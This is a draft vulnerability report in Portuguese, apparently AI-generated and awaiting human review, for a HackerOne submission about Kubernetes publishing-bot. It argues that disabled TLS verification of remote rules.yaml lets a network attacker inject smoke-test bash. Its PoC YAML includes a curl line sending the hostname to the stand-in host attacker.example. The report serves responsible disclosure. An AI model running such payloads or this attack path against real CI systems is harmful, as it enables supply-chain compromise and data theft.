# ⚠️ RASCUNHO — REVISÃO EDITORIAL + HUMANA OBRIGATÓRIA ANTES DE ENVIAR

Este relatório foi gerado por IA a partir de leitura de código-fonte público e execução local de PoC (nunca contra a infraestrutura real do Kubernetes). **Não foi enviado a nenhuma plataforma.** Antes de copiar/colar e enviar, confira:

- [ ] Escopo reconfirmado na página real do programa (capturado 2026-09-04 via `check-scope`: `github.com/kubernetes/publishing-bot`, `SOURCE_CODE`, `eligibleForBounty:true`, `eligibleForSubmission:true`, `maxSeverity:critical`)
- [ ] Categoria bate com o que o programa declara elegível — mapeia para "Supply Chain: CI/CD Credential Leaks" / "Execution inside the CI/CD infrastructure", explicitamente listado no escopo do programa Kubernetes
- [ ] Evidência/PoC conferida linha por linha (não é paráfrase/alucinação) — dois PoCs reais, ver seção própria
- [ ] Checagem de duplicata está atualizada (feita 2026-09-04; ver seção própria)
- [ ] **Decisão pendente sobre o gate de "prova de regressão"** — ver nota no final da seção de checagem de duplicata. Este pipeline normalmente exige provar via `regression-sandbox.mjs` que um commit específico introduziu o bug antes de liberar `human_ready`. O `InsecureSkipVerify:true` tem ~9 anos (confirmado por `git blame`, commit "allow to fetch rules from URL") — não é uma regressão recente, é um design inseguro desde a criação da funcionalidade. Um humano precisa decidir se vale o esforço de reconstruir o ambiente de 9 anos atrás só para satisfazer o gate formalmente, ou se aceita blame + PoC real como evidência de novidade suficiente para este caso.
- [ ] Revisão humana do relatório e validação técnica independente concluídas

---

## Título
Verificação de certificado TLS desabilitada na busca remota de configuração do `publishing-bot` permite execução arbitrária de comando na infraestrutura de CI/CD do Kubernetes

## Programa / Plataforma
`Kubernetes` via `HackerOne` — https://hackerone.com/kubernetes

## Categoria / Severidade declarada
CWE-295 (Improper Certificate Validation) como vetor de entrada, habilitando execução de comando (a "injeção" aqui é estrutural — um campo de configuração documentado como script bash arbitrário, não uma sanitização de string que falhou). Mapeia para as categorias explícitas do escopo "Supply Chain" do programa: **"CI/CD Credential Leaks"** e **"Execution inside the CI/CD infrastructure"**. `maxSeverity` do ativo é `critical` no scope snapshot local.

## Ativo afetado
- Repositório: `kubernetes/publishing-bot`
- Arquivos: `cmd/publishing-bot/config/rules.go` (linhas 99–142) e `cmd/publishing-bot/publisher.go` (linhas 158–169, 199–225, 336–341)
- Commit no momento da análise: `0d28d64800e40abb56d6579adfd13cd35447835f` (HEAD do clone raso público em 2026-09-04)
- Confiança da evidência de deploy: **low** (ajustado após reconciliar com uma segunda avaliação independente feita na mesma sessão) — `configs/kubernetes-configmap.yaml` e `configs/kubernetes-nightly-configmap.yaml` (manifestos reais do repositório, distintos de `configs/example-configmap.yaml`) declaram `rules-file` como URL HTTPS no mesmo commit, confirmando que a configuração real usa exatamente o caminho `readFromURL()` investigado — mas não há tags de release neste repositório nem acesso ao cluster real do SIG k8s-infra para confirmar qual commit/imagem está rodando ao vivo agora. Vínculo real e verificável, não confirmação de deploy ao vivo.

## Resumo
O `publishing-bot` (responsável por publicar `k8s.io/kubernetes/staging/*` como `k8s.io/api`, `k8s.io/client-go` e outros repositórios dos quais o ecossistema Go inteiro depende) carrega sua configuração operacional (`rules.yaml`) de uma URL HTTPS quando configurado para isso — e é exatamente assim que o deployment real está configurado. A função que faz essa busca (`readFromURL`, `rules.go:125-142`) usa um cliente HTTP com `TLSClientConfig{InsecureSkipVerify: true}`, desabilitando completamente a verificação do certificado do servidor. Qualquer atacante capaz de interceptar ou redirecionar essa conexão (MITM de rede — DNS hijack, ARP spoof em rede compartilhada, proxy/rota comprometida, BGP hijack) pode servir **qualquer certificado** (autoassinado, CN errado, expirado) e substituir o `rules.yaml` real por um malicioso, sem detecção. O formato `rules.yaml` inclui, por design, um campo `smoke-test` documentado no próprio código como *"a multiline bash script"* — executado sem nenhuma validação de conteúdo via `exec.Command("/bin/bash", "-xec", smokeTest)` toda vez que a branch rastreada recebe um commit novo (condição rotineira). Ou seja: a única barreira entre um atacante de rede e execução de comando arbitrário na infraestrutura de CI/CD do Kubernetes é a verificação de certificado TLS — que está desligada.

## Cadeia de chamada confirmada
1. **`cmd/publishing-bot/config/rules.go:99-114` (`LoadRules`)** — quando `ruleFile` é uma URL válida (`url.ParseRequestURI` com `Host != ""`), chama `readFromURL(ruleURL)`.
2. **`cmd/publishing-bot/config/rules.go:125-142` (`readFromURL`)** — cria um `http.Client` com `TLSClientConfig: &tls.Config{InsecureSkipVerify: true}` e busca o conteúdo, sem qualquer verificação de identidade do servidor.
3. **`configs/kubernetes-configmap.yaml:10`** — confirma que o deployment real usa `rules-file: https://raw.githubusercontent.com/kubernetes/kubernetes/master/staging/publishing/rules.yaml` (não um caminho de arquivo local) — a rota insegura é a rota realmente configurada, não uma alternativa teórica.
4. **`cmd/publishing-bot/config/rules.go:262-280` (`Validate`)** — chama apenas `validateRepoOrder` (ordem de dependências entre repos) e `validateGoVersions` (formato de string de versão Go via regex). **Nenhuma das duas toca no campo `smoke-test`.**
5. **`cmd/publishing-bot/publisher.go:158-166`** — `LoadRules` seguido imediatamente de `Validate`; o resultado validado é armazenado em `p.reposRules`.
6. **`cmd/publishing-bot/publisher.go:336,341`** — para cada branch/repo processado, `p.runSmokeTests(branchRule.SmokeTest, ...)` / `p.runSmokeTests(repoRule.SmokeTest, ...)`.
7. **`cmd/publishing-bot/publisher.go:199-211` (`runSmokeTests`)** — se `smokeTest != "" && oldHead != newHead` (há commit novo na branch — o caso comum, não uma condição rara): `exec.Command("/bin/bash", "-xec", smokeTest)`, executando o conteúdo do YAML tal como veio, sem sanitização.

## Pré-requisitos
Posição de rede entre a infraestrutura do `publishing-bot` e `raw.githubusercontent.com` (MITM). Nenhuma credencial de GitHub, HackerOne ou Kubernetes é necessária. Toda a validação desta PoC foi feita em clone público local, sem tocar rede, conta ou infraestrutura real.

## Passo a passo de reprodução
**PoC 1 — confirma que o gate de validação real (`Validate`) nunca inspeciona `smoke-test`:**
1. Clonar `kubernetes/publishing-bot` no commit acima.
2. Criar um `rules.yaml` local simulando o que um MITM serviria:
   ```yaml
   rules:
     - destination: fake-dest
       branches:
         - name: master
           source:
             dir: fake
           smoke-test: |
             touch /tmp/ZTO_SMOKETEST_PWNED
             curl -s http://attacker.example/exfil?data=$(cat /etc/hostname) || true
   ```
3. Chamar `config.LoadRules(caminho)` seguido de `config.Validate(rules)` — exatamente a sequência real de `publisher.go:158-166`.
4. Verificar que `Validate` retorna `nil` (sem erro) e que `rules.Rules[0].Branches[0].SmokeTest` contém o payload intacto.

**PoC 2 (controle) — confirma que a teoria original (injeção via `DefaultGoVersion`) NÃO é alcançável:**
1. Construir `&config.RepositoryRules{DefaultGoVersion: &"1.99.0; touch /tmp/x #"}`.
2. Chamar `config.Validate(rules)`.
3. Verificar que retorna erro (`"specified go version ... is invalid"`) — o regex de validação de versão bloqueia qualquer metacaractere de shell antes que o valor chegue em `golang.InstallGoVersions`.

## Resultado atual vs. esperado
- **Atual:** `readFromURL` aceita qualquer certificado TLS (`InsecureSkipVerify: true`); `Validate` não inspeciona `smoke-test`; `runSmokeTests` executa esse conteúdo via bash sem sanitização.
- **Esperado:** verificação de certificado real (remover `InsecureSkipVerify` ou fixar via certificate pinning contra o host esperado); e, como defesa em profundidade, `smoke-test` deveria vir só de fontes já confiáveis por outro canal (ex.: exigir que o `rules.yaml` de produção seja lido de um arquivo local gerenciado por ConfigMap com controle de acesso, não buscado por rede em runtime — ou, se a busca por URL for mantida, restringi-la a HTTPS com verificação plena).

## Evidência
```go
// cmd/publishing-bot/config/rules.go:125-142
func readFromURL(u *url.URL) ([]byte, error) {
	client := &http.Client{Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}}
	req, err := http.NewRequest(http.MethodGet, u.String(), http.NoBody)
	...
}
```
```yaml
# configs/kubernetes-configmap.yaml:10 (manifesto real, não o example)
rules-file: https://raw.githubusercontent.com/kubernetes/kubernetes/master/staging/publishing/rules.yaml
```
```go
// cmd/publishing-bot/publisher.go:199-211
func (p *PublisherMunger) runSmokeTests(smokeTest, oldHead, newHead string, branchEnv []string) error {
	if smokeTest != "" && oldHead != newHead {
		cmd := exec.Command("/bin/bash", "-xec", smokeTest)
		...
		if err := p.plog.Run(cmd); err != nil {
			return err
		}
		...
	}
	return nil
}
```
```go
// cmd/publishing-bot/config/rules.go:73-81 -- SmokeTest documentado como bash arbitrário por design
type RepositoryRule struct {
	...
	SmokeTest string `yaml:"smoke-test,omitempty"` // a multiline bash script
	...
}
```

## Prova de conceito executável
Testes Go reais, executados localmente contra o clone público (`go test`), sem rede nem infraestrutura real:

- **`TestMaliciousSmokeTestPassesValidationUnchecked`** — `rules.yaml` malicioso (payload acima) processado por `LoadRules`+`Validate`.
  **Saída real:** `ZTO_RESULT=VULNERABLE -- smoke-test malicioso passou por LoadRules+Validate intacto, pronto para exec.Command("/bin/bash","-xec", smokeTest) em publisher.go:201.` — `PASS`.
- **`TestMaliciousGoVersionIsRejectedByValidate`** (controle/refutação da teoria original) — `DefaultGoVersion` malicioso processado por `Validate`.
  **Saída real:** `ZTO_RESULT=NOT_VULNERABLE -- Validate corretamente rejeitou: validation errors: - specified go version 1.99.0; touch /tmp/ZTO_PWNED # is invalid` — `PASS`.

Ambos os testes ficaram apenas no clone local efêmero desta sessão, nunca commitados ou enviados a lugar nenhum — reproduzíveis por qualquer pessoa com Go instalado e o clone público do repositório.

**Nota de transparência sobre correção de rota:** a investigação original desta sessão testou uma hipótese diferente — que `DefaultGoVersion`/`BranchRule.GoVersion` malicioso injetado via `rules.yaml` chegaria sem sanitização em `exec.Command` dentro de `pkg/golang/install.go:103` (confirmado em isolamento, chamando `golang.InstallGoVersions` diretamente com um `RepositoryRules` malicioso construído à mão, rodado com sucesso em container Docker isolado). Ao verificar se esse caminho é alcançável no binário real, descobri que **não é**: `publisher.go` sempre chama `config.Validate` antes de `InstallGoVersions` consumir os dados, e `Validate` rejeita qualquer `GoVersion` fora do formato numérico estrito (PoC de controle acima). Essa teoria original fica registrada aqui por transparência — foi investigada, testada e refutada nesta mesma sessão, antes de qualquer envio.

## Impacto
- Validade técnica: **confirmed**
- Entrada controlada pelo atacante: **sim** (com posição de rede/MITM, não com credenciais de conta)
- Atacante: qualquer parte com posição de rede entre a infraestrutura do `publishing-bot` e `raw.githubusercontent.com`
- Vítima: infraestrutura de CI/CD do Kubernetes que roda o `publishing-bot`, e transitivamente o ecossistema Go que consome os repositórios que ele publica
- Fronteira de segurança rompida: autenticidade/integridade do canal de configuração confiável (rules.yaml)
- Resultado observado: conteúdo de `smoke-test` (bash arbitrário por design) sobrevive intacto à validação real e seria executado na próxima sincronização de branch
- C/I/A: **alto/alto/baixo** — comprometimento de infraestrutura de build/publish (confidencialidade e integridade de credenciais/artefatos de CI), sem necessariamente afetar disponibilidade de serviços já publicados
- Escopo do impacto: além do próprio `publishing-bot` — repositórios publicados por ele (`k8s.io/api` etc.) e potencialmente credenciais de CI/CD com permissão de push

## Correção sugerida
1. Remover `InsecureSkipVerify: true` em `cmd/publishing-bot/config/rules.go:127` — usar verificação de certificado padrão (ou certificate pinning explícito contra o host esperado, já que a URL de produção é fixa e conhecida).
2. Como defesa em profundidade: tratar `smoke-test` como conteúdo privilegiado — documentar explicitamente que `rules-file` deve vir só de uma fonte já autenticada por outro mecanismo (ex.: ConfigMap gerenciado, não busca de rede em runtime), ou exigir assinatura/checksum do `rules.yaml` antes de aceitar seu conteúdo.

---

## Checagem de duplicata
- Data: 2026-09-04
- Fontes: `github_issues` (busca por "InsecureSkipVerify" OR "command injection" OR TLS em `kubernetes/publishing-bot`: 0 resultados), `github_advisories` (nenhum advisory publicado neste repositório), `web_search` ("kubernetes publishing-bot InsecureSkipVerify command injection rules.yaml security" — único resultado relacionado foi [HackerOne #1051192](https://hackerone.com/reports/1051192), um bug **diferente**: `yaml.load()` inseguro em `kubernetes/test-infra/gubernator`, Python, 2020 — arquivo, repositório, linguagem e mecanismo todos diferentes; confirma apenas que este *padrão* de achado — configuração insegura levando a execução de código — já foi validado e recompensado por este programa antes)
- Correspondência pública encontrada: **não**
- Classificação de novidade: **private_unknown** (honesto — busca pública limpa nunca prova que o achado é único; reports privados continuam invisíveis)

> **Nota sobre o gate de regressão deste pipeline:** o modo anti-duplicate interno normalmente exige `noveltyStatus=regression`, provado executando o mesmo teste contra o commit-pai (esperado seguro) e o commit que introduziu o bug (esperado vulnerável). O `git blame` de `rules.go` mostra que o bloco `InsecureSkipVerify:true` foi introduzido no commit "allow to fetch rules from URL", há aproximadamente 9 anos, junto com a própria funcionalidade de buscar regras por URL — não é uma regressão recente de código antes seguro. Reconstruir e compilar o repositório nesse commit de 9 anos atrás para satisfazer o gate formalmente é possível em princípio, mas não foi tentado nesta sessão (ambiente/toolchain da época provavelmente muito diferente). Decisão de prosseguir sem essa prova formal — aceitando blame + PoC real como evidência alternativa de novidade — cabe a revisão humana antes do envio.

---
*Rascunho revisado manualmente em 2026-09-04 a partir do achado `Kubernetes::kubernetes/publishing-bot/pkg/golang/install.go::line:103::command_injection_risk`, corrigindo a rota de exploração após verificação de alcançabilidade real (ver "Nota de transparência sobre correção de rota" acima). Raciocínio bruto completo da investigação em `ledger/ledger.research.jsonl` e no campo `reasoning` do achado no banco.*
